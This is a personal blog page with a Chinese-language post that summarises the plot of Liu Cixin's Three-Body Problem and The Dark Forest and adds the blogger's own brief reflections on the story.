<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
    

    <!--Author-->
    
        <meta name="author" content="V">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="V&#39;s blog">
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="V&#39;s blog">

    <!--Type page-->
    
        <meta property="og:type" content="website">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>V&#39;s blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">V's blog</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/08/02/三体/">
                三体
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-08-02</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    <img src="%E4%B8%89%E4%BD%93/1564721017718.png" alt="1564721017718"></p>
<p>这个暑假，读了三体一书。</p>
<p>​    粗浅的用一句话概括三体这套书，三体人想要侵略地球，人类跟他丫死磕。</p>
<p>​    故事情节跌宕起伏，勾人心弦，但三体令人着迷的地方，不单单只是因为他有一个好故事，更吸引人的地方，是他还拥有发人深思的魔力。</p>
<h3 id="三体-1"><a href="#三体-1" class="headerlink" title="三体"></a>三体</h3><p>​        故事是由三体人和人类中两个默默无闻的人引发的。分别是三体人1379号和地球人叶文洁。故事先从三体人的基本情况说起。三体人居中在距离地球4.3光年外，和人类是非常近的邻居。他们居住的星球非常坑，因为引力作用，三体星球会被拉来拉去，这会导致，这颗星球有时候特别冷，有时候特别热。只有在距离刚刚好的时候，三体文明才会蓬勃发展。还有一种极端的情况，这颗星球会被三体的引力撕裂，那么三体文明就彻底结束了。三体人所面临的问题，便是数学上非常经典的三体问题，小说名字也是由此而来。因为三体问题，三体人没有办法对未来进行准确的预测。像咱们人类都习惯了第二天早上太阳会升起来，但三体人可就没那么好命，第二天太阳是否会升起来，哪个三体人都不知道。在这种环境下，三体人还进化出了一种脱水的能力，以便在恶劣的环境中休眠，正所谓生于忧患而死于安乐，三体人疯狂的发展科技，想找到一个靠谱的星球，就像地球那样，可以在那里生活，因此三体人投入了大量的人力物力，天天仔细监听宇宙里的各种信号，不想放过一丝能找到新家园的机会。</p>
<p>​        接下来是叶文洁，就是她把三体人引过来的。叶文洁是一对中国科学家夫妻的女儿，小日子过得很幸福。但她的父亲在文革期间由于不愿意说谎认罪，被四个都是中学生的女红卫兵，用武装皮带当众抽打致死；母亲在文革中也疯了。后来叶文洁加入了建设兵团，她亲眼目睹了这群人的疯狂，山林草原都变成了荒漠。在这个过程中，他认识了一位记者，白沐林，二人成为了知己。后来这位知己想要给中央寄一封信，反映建设兵团不是在建设而是在毁坏环境。叶文洁看了信后大加赞赏，整封信内容丰富，逻辑缜密，令他信服，但这个记者长期干重活，导致手抖的厉害，于是叶文洁就帮知己重新抄了一遍，后来上级追查了下来，认为这是反动的行径。于是乎这位知己便出卖了叶文洁，说自己并不知道信的内容，这一下全部的责任都推给了叶文洁，叶文洁被关进了看守所，在看守所她拒绝签字陷害她的父亲，受到了变本加厉的迫害，这一切的丑恶让她心中的反人类种子长成了参天大树。对人类彻底的绝望了。后来叶文洁父亲的学生杨伟宁得知此事后，通过让她参与红岸基地的红岸计划救出了叶文洁。</p>
<p>​        红岸计划的主要目的是寻找外星人，以求科技飞跃，这个计划需要的人才极其苛刻，不过叶文洁的条件正好符合，但加入的代价是永远留在基地，与世隔绝。绝望的叶文洁还不犹豫地答应了。几年后，叶文洁和这位父亲的学生，自己的恩人，杨伟宁组建了家庭，生了一个女儿，杨冬。</p>
<p>​        工作期间，聪明的叶文洁利用太阳强化天线功率，向太空发出了地球的第一封信，里面包含着地球文明的基本信息。这个信号，可是三体人做梦都在找的，收到叶文洁信号的是那个叫1379号的三体人。三体的文明是高度集权的，处于极端的专制中，对个体的尊重几乎不尊重。有多不尊重呢？不能工作的人，就得死。毕竟在这种星球环境下，集权才能快速发展三体的文明。1379号孤独地生活了大半辈子，1379号所在的监听站，已经有上千年的历史了。这里只有他一个人，他每天都在一个小房子里，作者监听宇宙信号这种无聊底层的工作。在三体世界里，这是一个卑微的职业，处在社会的最底层，没有人注意他，更悲催的是，他一辈子什么也没听到。命运总是不期而遇，1379号收到了叶文洁的信号，他看到信息时非常感动，毕竟他等了一辈子，他通过自译解系统，看懂了叶文洁发来的信息，他发现这个遥远的星球，就是自己梦中的天堂，全三体人心中理想的家园。他不想把这一消息通知上级，他知道这意味着地球会被侵略，而且即便三体人成功占领地球，也和他没关系，并且一旦他完成任务，他将很有可能失去在社会中存在的价值，也就是说1379的成功，不会改变他孤独而卑微的生活，说不定还会更糟。渐渐地他爱上了这颗遥远的美丽星球，于是他给叶文洁回复了这么一段信息，不要回答，不要回答，不要回答。后面还有一段信息，大致内容如下：我是一个和平主义者，我不知道你是谁，在你的信号来源的方向，是有无数颗行星的。我们无法确定你们的位置，但只要你回复，我们一定会找到你们，我们一定会侵略地球。这一条信息，相当于把三体人千年等一回的机会给放弃了。这条信息一发出去，1379马上就给抓住了，由于1379已经很老了，元首给了他自由，想让他活到地球失去一切希望的那一天，让它美美梦破裂，这叫杀人诛心。与此同时，元首下令，处死与此相关的其余六千位三体人。</p>
<p>​        叶文洁收到外星人的回复后，惊讶不已，心跳加速，已经无法冷静思考的她，她认为人类已经没希望了，所以他想通过三体人这个外力，来帮助人类。便回复了：来吧来帮助我们吧，来侵略我们吧，我来帮你们获得地球。不久后，叶文洁的上级发现了哪里不对，知道了他是在和外星人联系。当那位上级去悬崖下面检查仪器的时候，叶文洁为了保证秘密不被泄露，冷静淡定的锯断了绳索，导致领导坠崖身亡，捎带着把自己老公也杀了。后来这个坠崖事件，被当做普通的工作事故处理了，没人对叶文洁起疑心。锯断绳子的那一刻，叶文洁就已经下定决心，从今儿起，老娘就要把革命的事业进行到底。</p>
<p>​        三体人那边，1379刚捣乱就被抓了，但叶文洁回复时却没人知道。她就在这种没人直接干预的情况下，为全人类也做了个要命的决定。叶文洁这条信息，飞了四年到达了三体星球，三体人对这突如其来的幸运，感到无比幸福。毕竟地球离得这么近，于是三体人把所有资源都用在了造飞船上，之后三体人联系上叶文洁，请她做好接应工作，这一部分就是整个故事的开端。</p>
<p>​        1379和叶文洁这两个无名小卒，一个差点让三体人对生存的机会失之交臂，而另一个给全人类带来了几百年的噩梦，在以前信息闭塞的时代，没有权势的无名小卒，是不可能影响整个世界文明的。但如今这俩人聊着天，就把各自星球的文明，翻来覆去改变了两次。这里警示了我们，让外星人知道我们在哪，是一件特别不着调的事。霍金在之前也说了几乎一样的观点，千万别跟外星人瞎联系。</p>
<p>​        文革过去了，叶文洁终于得以平反，走出了深山，并且可以回到母校任教。由于资历深，叶文洁被选中去负责发射基地的选址项目。她在西北地区认识了一个热爱大自然的国外富二代伊文思，伊文思也是后来在地球接应三体人真正负责人。他虽然富甲一方，但他依然改变不了人们对地球环境的破坏，他一样期望着通过外星人的力量来帮助人类，于是伊文思和叶文洁决定携手共创辉煌，两人成为了地球上三体组织的创始人。他们相互表达敬意，伊文思说出了以后，地球三体组织接纳新成员时必说的一句话，我们是同志了。</p>
<p>​        多年过后伊文思在秘密地在一艘巨轮上，创立了第二红岸基地，在巨轮上建立是为了方便移动便于隐藏。根据叶文洁提供的信息，伊文思与三体人建立了通讯，这里的人将叶文洁称之为最高统帅，这个反人类的组织，目的很明确，消灭人类暴政，世界属于三体。</p>
<p>​        三体人派出了一种叫智子的东西，来封锁地球的基础科学。智子是一个超级微型机器人，它非常的小，可以被加速到接近光速，只要四年多的时间，它就可以从三体行星达到地球。三体人对微观世界的研究远超人类，智子的制造原理非常晦涩难懂，三体的科学家先把复合粒子中的质子展开成二维，然后在质子宏达的二维展开面上，搭建集成电路，制造好后，再把它收缩回普通质子的大小，这样，这个微观粒子，就变成了超级智能计算机。由于智子的捣乱，国际知名组织，科学边界里很多杰出的科学家纷纷自杀，可见三体人把人类科学家逼成什么样了。经政府机构邀请，一位五大三粗，一脸横肉不修边幅的史强警察，和一名研究纳米材料的汪淼教授，开始调查此事。自杀名单中，还包括了叶文洁的女儿杨冬，家人发现了她服用了大量安眠药，死在了床上。杨冬的男友丁仪，给汪淼他们看了杨冬的遗书。遗书很简短也没签字，内容如下，物理学从来就没有存在过。将来也不会存在。我知道自己这样做是不负责任的，但别无选择。史强和汪淼这俩人，一开始像磁铁的两个正极一样合不来，但在后来的合作中，两人产生了感情。正在调查的汪淼，眼前突然出现了一组消散不去，正在倒计时的数字，这组幽灵倒计时可把汪淼折腾惨了，当他暂停了工作，去探求真相后倒计时消失了。汪淼通过射电望远镜，发现了宇宙辐射背景下的倒计时，他相信一定有某种神奇的力量，限制着人类科学。这其实也是智子搞的鬼。它不仅能限制人类的微观研究，还能展开成二维，干扰人类的宏观研究。经过深入的调查，汪淼他们发现了一款名叫三体的游戏。这游戏非常真实，其内容都是尽量还原三体人的生活环境，几经波折后，汪淼通关了游戏，收到了参加三体玩家线下聚会的消息。负责人询问各位玩家，是否同意三体人降临地球，汪淼假装同意，打入了敌人内部，进入组织内部的汪淼惊讶发现，这个组织的精神领袖，正式杨冬年迈的母亲叶文洁。不久之后，史强汪淼里应外合把地球叛军这个组织拿下了，叶文洁被活捉，随后大家便知道了第二红岸基地这艘邮轮的存在。面对这帮叛徒，干掉他们是其次的，最重要的是，获得他们与三体人的聊天记录。毕竟从聊天记录里，能掌握大量的地方情报，也能知道对手的要害在哪。</p>
<p>​        人们为了拿到这份聊天记录，费了千辛万苦，首先上船抓是不靠谱的，这帮人都是亡命徒，随时可能跟数据资料同归于尽，也不能对这艘船进行军事打击，万一炸了，那就功亏一篑了。在审问中人们得知了一个千载难逢的好机会，这艘船会在某一天经过巴拿马运河。这个运河最窄的地方就150米，史强想了个法子，在河的两边架起两根高高的杆子，在杆子上拉起了超韧性的纳米级细丝，每隔50cm拉一根，这些看不见的细丝，锋利无比。如果这艘船穿过这个纳米细丝组成的墙，船和人都会像切豆腐一样被切开，船上的任何人都来不及任何应急措施。当然，用来储存各种数据的硬盘，也会被切开，不过会被切的很平整，是可以还原的。这次行动被称为古筝计划。古筝计划非常成功，这艘船像一叠扑克牌一样，刷的一下就分开了，变成了千层糕，船被切成了50厘米的薄片，伊文思也被切成了三段。人们在船的废墟里，找到了想要的资料，一共有28个G，人们仔细研究了这些资料，得到了两个非常重要的情报。</p>
<p>​        一个大的坏消息是，智子除了封锁人类科技发展，它还是个超级监视器，它利用自己的光速移动能力监视所有人，干扰各别科学家的视神经，每一个人类说的每一句话，做的每一件事，三体人都在全程看直播。如此重要的情报，让人类知道任何开会讨论出来的计划，都会被三体人知道。古筝计划的成功，其实是三体人为了借人类的手，消灭这帮地球叛军的计划。因为三体人的思想是透明的，他们通过思维直接交流，不会撒谎，当他们得知人类有撒谎这个技能后，非常的恐惧。人类在得知有智子这个东西后，智子就不能再干扰人类的宏观观测了，因为它一旦在展开成二维，就很可能被人类消灭。之前汪淼和一些科学家眼前的幽灵倒计时，就是指在在人视网膜上搞的把戏。第二个情报是，在地球上三体人怕一个人类，而且只怕这一个人，地球叛军曾经多次想要杀死他，这个人，就是罗辑。</p>
<p>​        这个故事告诉我们，如果发现组织里有叛徒，最关键的不是消灭它，而是获取敌方高价值的信息，如果叛徒这个棋子用的好，你会比敌人更有利。</p>
<p>​        后来人类所发展的所有战略， 都是基于这两个信息：地球上有个叫智子的机器人在捣乱，和三体想杀一个叫罗辑的男人。人们紧急召开了国际会议，讨论如何应对危机，此时三体人通过智子，给每个人眼前显示出了相同的文字，你们是虫子。</p>
<p>​        当全世界的人得知此消息后，便开始陷入了绝望，汪淼在得知整个事情的来龙去脉后，和杨冬的男友丁仪借酒消愁。两位科学家感叹着人类在三体人眼里就是虫子，还是即将灭绝的虫子，他们耍着酒疯大喊道，末日万岁，虫子王万岁，智子万岁。史强看到后为了给他们大气，让他们振作，把俩人带到了一片麦地，他们注视着麦田，蝗虫在这片麦地漫天飞舞，像沙尘暴啃食着庄稼，两人看到这一幕心有所想，人类与蝗虫科技之间的差距，比人类和三体人之间大多了。我们用飞机喷洒各种杀虫剂，培育他们的天敌，无所不用其极地想消灭他们，但他们翱翔于天地之间，没有被灭绝。把人类看成虫子的三体，似乎忘记了一个事实，虫子虽然很弱小，但从来没有被真正消灭过，三人沐浴在这生命的暴雨中，感受着地球生命的尊严。汪淼和丁仪把手中拎这的酒慢慢洒在脚下，他们说，这，是敬虫子的。</p>
<h3 id="黑暗森林"><a href="#黑暗森林" class="headerlink" title="黑暗森林"></a>黑暗森林</h3><p>​        书的开篇借用一只褐蚁，在叶文洁女儿杨冬的墓碑上爬行，引出了一段往事。上本书的主角叶文洁和新主角罗辑，在叶文洁的女儿杨冬墓前见面，新主角罗辑是杨冬的高中同学，很聪明，但胸无大志，以前是搞天文学的，犹豫不好混现在改行教社会学。叶文洁给出了一条建议，让他把这两个专业结合，做出，宇宙社会学。并给出了两条宇宙社会学的公理：第一，生存是文明的第一需要；第二，文明不断增长和扩张，但宇宙的物质总量保持不变。和两个重要概念，猜疑链和技术爆炸。说完这些，叶文洁便匆匆的离开了。离别时自言自语道，我尽了责任。</p>
<p>​        时光荏苒，多年过后，人类已经知道三体在400年后即将降临，世界各国政府进入了备战状态，准备齐心合力保卫家园。由此开始了，危机纪元。世界上正发生着这几件大事，第一件，规划组件太空军。在这支太空军里，有一位主角，章北海，他是军人世家。在外人眼里，他坚信人类必胜，收到组织高度重视。后来太空军选出了一批信仰坚定的军人冬眠，去增援末日之战，其中就包括他。第二件，全球技术公有化，联合国逐渐成为世界政府，国家的边界开始模糊，地球上出现了逃亡主义，他们认为，地球科技已被锁死，走出太阳系，寻找新家园才能延续下去。但毕竟资源有限，大多数人要留在地球上。不久之后，人人平等的口号响彻地球，联合国一致决定，要死一起死，坚决反对逃亡主义。一时间，保卫家园，绝不逃离，成为了世界的主旋路以及政治正确。</p>
<p>​        画面一转，罗辑这位花花公子，和一位女伴刚从宾馆出来，突然一辆疾驰的车向他们撞来，恰好被消防栓绊倒的罗辑，侥幸逃过一劫。但女伴却被当场撞死。罗辑以为这是意外，他不知道这是三体人给地球叛军下达的暗杀命令。不明真相的罗辑被警务人员带进了一个地下十层的小房子里，在这，他与上本书中的史强相识了。随后，罗辑被大批武装部队护送上了飞机，在多架歼击机的护航以及数名保镖的护送下，罗辑安全抵达了联合国会场，这突如其来的大场面，换在谁身上都得蒙圈。大会上联合国秘书长，宣布了面壁者计划。面壁计划是基于这两个主要情报产生的：一、地球在三体人那已经完全透明了，任何交流、会议都变成了现场直播；二、三体人的弱点在于不懂说谎，在他们的世界里没有阴谋、暗算这些词。面壁计划的核心在于，选出四个战略计划的制定者和领导者，他们完全按照自己的思维制定计划，不与外界交流，计划真正的目的和意图都藏于他们的大脑。他们所表现出来的行为应该是欺骗敌人。这四人被称之为，面壁人。面壁人拥有最高权力去调集地球资源，简而言之就是在世界上选出四个有能力的大骗子，去骗三体人。</p>
<p>​        秘书长公布了面壁者名单。第一位面壁者是刚刚卸任的美国国防部部长，泰勒；第二位是委内瑞拉现任总统，雷迪亚兹；第三位是世界知名脑科学家，希恩斯；第四位是，罗辑。罗辑听到自己名字后差点晕过去。各国领导人，和世界知名人物，齐刷刷地盯着他。罗辑被搀扶到了主席台上。大脑一片空白的罗辑在散会后才回过神，他认为这是搞错了，不断地向所有人拒绝自己面壁人的身份。而所有人都以为，他，已经开始演戏了。</p>
<p>​        当他一人冲出大会后，又遭到了暗杀，被狙击手一枪撂倒。好在他一路上都穿着防弹衣，这之后罗辑一直被保护着，慢慢地，罗辑也想通了。既然自己没法辞职，不如利用特权好好享受人。正当其他面壁者殚精竭虑，绞尽脑汁，准备大干一场时，罗辑的要求在联合国眼里非常奇特， 他先要了个依山傍水，被自然拥抱的山庄，去那开始享受社会文雅的贵族生活。随后，他只要说一句，这是面壁者计划的一部分，他所有花花公子的欲望都会被满足。而事实上，那些世界领导人觉得，罗辑干得很好，不仅让人捉摸不透，还比其他三位花钱少。</p>
<p>​        三体人通过智子，从残余的地球叛军中，选中了三个人，去破解面壁人的计划。这三位被称之为，破壁人。罗辑没有破壁人，因为三体人知道，只要罗辑他自己想不明白，他就是自己的破壁人。其他的三位面壁人，有人在研究核弹，有的在研究军队，有的在研究脑科学。而罗辑在干嘛呢？他在泡妞。</p>
<p>​        他把史强找来，让史强去安装自己的描述，找到他梦中的女神，史强很快找到这个人，她的名字叫，庄颜。是中央美院国画系刚毕业的大学生，史强很简单的就把她忽悠来了，她对庄颜说，世界需要你，面壁者需要你。当罗辑看见自己梦中的女神，活生生地站在面前时，整个人都傻了，他对庄颜说，你的工作是，使自己快乐，成为世界上最幸福最快乐的女孩。这是面壁计划的一部分。</p>
<p>​        不久后，罗辑带着庄颜，去了他最想去的卢浮宫。在蒙娜丽莎的微笑面前，两人坠入爱河，这位纯洁的小女生，成为了罗辑的妻子，从此开始了幸福的生活。史强在之前抓捕地球叛军的行动中，收到了辐射影响身患白血病，现代的医疗手段无能为力，在完成罗辑交代的这个任务后，他进入了冬眠。希望未来的医疗水平能救他一命。</p>
<p>​        五年后，第一个被破壁的面壁人是前美国国防部长，泰勒。破壁人以粉丝的身份走入他的家中，揭穿了他的目的。说道，你表面上是想建立一支太空神风敢死队，跟三体人死磕。其实，你的这批部队，会装备一种叫球状闪电的武器，被它打死的人会变成幽灵态，在开展前夕，你会让他们去偷袭地球军队，把自己人打成量子态的幽灵部队，让他们去死磕三体人，在破壁人揭穿泰勒的计谋后，来了一句神补刀。即便您成功了，主也不在乎。</p>
<p>​        破壁人将自己的成果发到网上，随后舆论哗然，大家接受不了泰勒杀死自己的人的计划，失落的泰勒，在罗辑别墅的周围，饮弹自尽。</p>
<p>​        从此人们对面壁者产生了越来越多的质疑，罗辑的好日子也到头了。世界政府秘密地将他的妻子和孩子冬眠送到未来，强迫罗辑做点什么，毕竟他是三体人唯一要暗杀的人类。苦思冥想的罗辑，走在已经被冻结的湖面上。哗啦一声，冰面裂开，罗辑掉入了湖里，在漆黑冰冷的湖水里，他终于明白当初叶文洁对他说的那番话是什么意思了。好在罗辑身体素质还行，不然差点就淹死了。 </p>
<p>​        悟出真想的罗辑，赶紧动用特权，把他护送到一个及其安全的地下室，在这里，罗辑通过自己的权利，向宇宙发射了一个恒星的坐标，这件事被后人戏称为，逻辑的咒语。由于咒语很久后才能生效，所以罗辑告诉医务人员，把他送去冬眠，等那颗恒星爆炸后，再唤醒他。但很快，他就在一次遭到了暗杀，这一次使用的是基因武器，针对目标进行病毒感染，现在的医疗手段对它毫无抵抗能力，罗辑立刻被医疗人员强行冬眠，希望在未来，能有医疗手段治疗他。</p>
<p>​        八年后，面壁者雷迪亚兹和希恩斯从冬眠中被唤醒，他们被告知，技术已经成熟到他们的预期了，脑科学家希恩斯得到超级计算机。不久之后，他和妻子造出了思想钢印，思想钢印可以在人脑中输入任何信息，并让这个人坚信不疑。比如，在受印者脑中输入水是有毒的，渐渐地他就再也不敢喝水了，这台机器的主要用途在于给人类太空军的思维打上人类必胜的信念。</p>
<p>​        核弹狂人雷迪亚兹得到了3.5亿吨的恒行型氢弹，紧随其后的是，他的破壁人出现，破壁人说道，你想造一百万可恒星氢弹放在水星上，主要的目的不是防御地球，而是为了引爆水星。把水星推进太阳里，从而让地球，火星，金星脱离轨道坠入太阳，与抵达的三体人同归于尽，毁灭三体人想得到的东西。这位破壁人在最后同样来了一句神补刀，你的计划，主不在乎。因为以地球的资源，根本造不出一百万颗恒星氢弹，即便造出来了，以远远不够把水星炸到脱离轨道。</p>
<p>​        破壁人先前也把资料上传到网上，舆论再次哗然，大家接受不了这种疯狂的举动。在之后的听证会上，雷迪亚兹的面壁者身份被终止，在准备抓捕雷迪亚兹时，他撒谎说自己的手环上是摇篮系统， 只要自己有生命危险，手环上的信号就会中断，从而引爆纽约市的氢弹，如果纽约市的氢弹被触碰也会爆炸，雷迪亚兹成功逃脱，在回国的路上，大家才知道这个摇篮系统不过是他为了脱身的幌子。</p>
<p>​        回国后，这位以往被国民认为是大英雄的前总统 并没有迎来鲜花和掌声，而是无数的石头，雷迪亚兹当场被无数的石头，砸死。</p>
<p>​        一百八十五年后，罗辑从冬眠中被叫醒，他发现周围的人充满自信，在这个时代，人们的基因渐渐进化，到处都是帅哥美女，人类掌握了两个技术，可控核聚变，这项技术的出现，彻底解决了人类的能源问题，石油能源被淘汰了。在这个时代已经没有省电省水的概念了，所有的电器都不再使用电池。另一项是，基因改造技术，彻底解决了粮食问题。</p>
<p>​        现在人们造出了两千艘太空战舰，飞船能达到光速的百分之十五，比三体人的飞船快多了。面壁计划很早就被废止了，罗辑当年向太空发送的咒语，被当成了笑话。为了准备与三体人作战，人们在一千米以下建立了城市，大多数人生活在地下，少部分人生活在地面上，主流语言变成了英语一汉语的杂糅语言，希望三体人占领地球的叛军组织，早在一个世纪前就被消灭了。之前人类经历的大低谷，那时候世界格局紧张异常，人人都处在备战状态，低落的情绪下，人们自暴自弃，经济开始大滑坡，环境开始恶化，全世界都发生了饥荒。人吃人成了常态，人口急剧下降，后来越来越多人逐渐想明白，既然灾难一定要来临，痛苦的一天也是一天，开心的一天也是一天，于是他们站出来引导大家，振臂高呼，给岁月以文明，而不是给文明以岁月。</p>
<p>​        随即人类的复兴运动兴起，文明加速进步，罗辑从冬眠中恢复了不少后，参加了最后一次面壁者远程听证会。在会上，他看到了已经苏醒的希恩斯和他的妻子助手，听证会像他们宣布了，面壁者计划被终止，所有面壁者恢复普通人的身份，希恩斯的亲子在大会上，对丈夫说道，我是你的破壁人。你所制造的思想钢印，给每个人打上的思想前面都加了负号，也就是说这些人，坚信的是人类必败，你是想培养出一批逃亡主义者，逃出地球。</p>
<p>​        会上的人无不惊讶，太空军开始调查这批被打上人类必败信仰的钢印族，散会后不久，这位面壁者的妻子，就切腹自尽了。而面壁者希恩斯并没有得到制裁。会后，罗辑碰上了老朋友史强，没多久，罗辑就再次遭到了暗杀，第一次差点被无人汽车撞死，第二次差点坠落身亡，第三次差点被机器人服务员捅死，第四次差点被毒死，第五次差点被只能沙发勒死，这次暗杀他的，是叫做killer的暗杀病毒，好在一向警觉敏锐的史强在他身边救了他。随后，他们为了躲避电脑追杀，离开了地下城市，去了地表。</p>
<p>​        另一边的增援未来的指挥官们被唤醒，由于钢印族隐藏得很深，所以这批被唤醒的军官，被任命为执行舰长，其中就包括章北海。章北海登上了自然选择号，舰长是一位漂亮的女生，名叫东方延续，他给了章北海一把手枪，说，如果发现我有失败注意的想法，可用它杀了我。结果指挥权的章北海立刻做出了让所有人都意料不到的举动，它通过各种指令，劫持自然选择号上的2000名船员，跑路了。</p>
<p>​        其实他一直都是一名伪装很好的失败主义者，他坚信人类必败，舰队司令部的司令们都懵了，这是什么状况？司令官们反映了半天才回过神来派出追击舰队。另一边，世界政府开始商讨如何安置即将被人类打败的三体人。与此同时，人类观测到，三体舰队派出了一个小型探测器，已经进入了太阳系。国际舰队决定，派出全部两千零十五艘恒星级战舰，拦截三体探测器，以显示地球的雄威。</p>
<p>​        此时地球上所有的媒体都在直播这一盛况，几乎所有人都激动地守在屏目前，有的发出兴奋的尖叫，有的感动得嚎啕大哭，无人不为自己文明而自豪，各地开始了接连不断的狂欢，舰队紧密的排成了100X20的长方形矩阵，一起去迎接。83岁的丁仪已经是这个时代最德高望重的科学家了，他被选中作为第一个接触三体小型探测器的人。先头飞船捕获了这枚探测器，这枚探测器外表像极了一滴水，它的表明光滑无比，如同明镜。于是人们给了她一个称呼，水滴。</p>
<p>​        谨慎的丁仪在接触水滴前，令他所在的量子号飞船，随时准备以最高速度跑路，同时临近的青铜时代号已经入了准备状态。水滴被成功捕获，这一画面传到了地球。几乎所有的人都在欢呼雀跃，热泪盈眶。丁仪博士上千仔细观看，他发现水滴的表面及其光滑，当他用显微镜看水滴表面时，他吓坏了。无论是放大一百倍，还是一千倍，一万倍，一百万倍，一千万倍。水滴的表面还是光滑无比，像镜面一样。这意味着，改物体密度极其的大，无比的坚硬，它可以轻易的横穿地球，且不会有丝毫损伤，就像子弹穿过奶酪。人们现在所能造出最光滑的东西，放大个几百倍，就可以看到粗糙的像重重山峰的纹理。惊讶无比的丁仪博士缓缓回过神来，自言自语道，毁灭你，与你何干。随后丁仪大喊一声，傻孩子们快逃啊。但一切都太晚了。</p>
<p>​        水滴干扰了信号，随后尾巴开始出现蓝色的光环，不断加速，捕获他的飞船瞬间汽化，随后它以全速精准地撞向，第一排第一列第一艘战舰的燃料舱。由于这些战舰用的都是核聚变燃料，燃料舱一炸就直接玩完，可见三体人对人类战舰的弱点了如指掌。它向石子划过空气一样穿过一艘又一艘战舰，整整齐齐的战舰像鞭炮一样，在太空中不断炸开了花。水滴仅仅用了1分28秒就贯穿了第一队列的一百艘战舰。由于水滴太小，人们对雷达根本检测不到，后排的舰队完全不知道怎么回事，就看见这眼前焰火表演。</p>
<p>​        水滴此时做出了一个不可思议的锐角急转，丝毫没有减速的撞向第二队列的飞船，后来科学家看到这段影像，都傻了。水滴的攻击方式，非常的原始，就是用头撞。当第三排战舰也炸完后，舰队开始散开准备逃跑。虽然他们不知道怎么了，但这样炸下去，不得不跑。</p>
<p>​        在散开的过程中虽然有战舰发现了水滴，并进行反击，但炮弹打到水滴上，丝毫没有反应。只是让他稍微减速了一下。水滴就像一枚死神的绣花针，以最短的路程，来回穿梭在战舰之间。正常战舰只有五十分钟，人类所有的骄傲与荣光。就被一枚小小的探测器，顷刻覆灭。</p>
<p>​        毁灭你，与你何干。这个故事可以看出，两个科技间存在巨大差距的文明，是不可能打的有来有往的。</p>
<p>​        这场战斗，只有两艘战舰逃离了战场，他们分别是青铜号和量子号。与他们不同方向的正在逃亡的自然选择号，以及追击它的四艘战舰。蓝色空间号，企业号，深空号，终极规律号，也幸存了下来。</p>
<p>​        章北海成为了这五艘战舰公认的英雄，如果他也是面壁者的话，他会是一名成功的面壁者。这无五艘战舰开始前往寻找新家园，但他们发现，最近的太阳系，以现在的速度航行，也要两千年。五艘战舰的燃料，配件，补给，只够一艘飞船达到目的地。所有人都渐渐明白这个残酷的事实，不是你死，就是我活。随着时间的推移。五艘战舰开始了彼此间的互相猜疑，都担心对方会首先发动攻击。终于，章北海下定决定要使用次声波氢弹首先发动攻击，这种攻击不会对船体造成伤害，只会消灭船内所有生命。但就当他要摁下发射键的时候，自然选择号首先遭遇了次声波氢弹袭击。在听到预警袭击的警报时，章北海放弃了发射，意味深长的说了一句，没关系，都一样。</p>
<p>​        瞬间，自然选择号全体船员，在次声波氢弹的袭击下，集体阵亡。发起首攻的是终极规律号战舰，他向其他的战舰也发出了次声波氢弹，但终极规律号并没有成为幸存儿，早就准备好的蓝色空间好抽干了船内的空气，没有空气，次声波就不会有任何作用。蓝色空间号随机反击，用全部武器集火终极规律号，终极规律号被彻底摧毁。随后，蓝色空间好开始打扫战场，他们拿走了所有能带的东西，飞向了远方。他们承载的人类的全部思想和记忆，怀抱着地球所有的荣光与梦想，默默地消失在永恒的夜色中。</p>
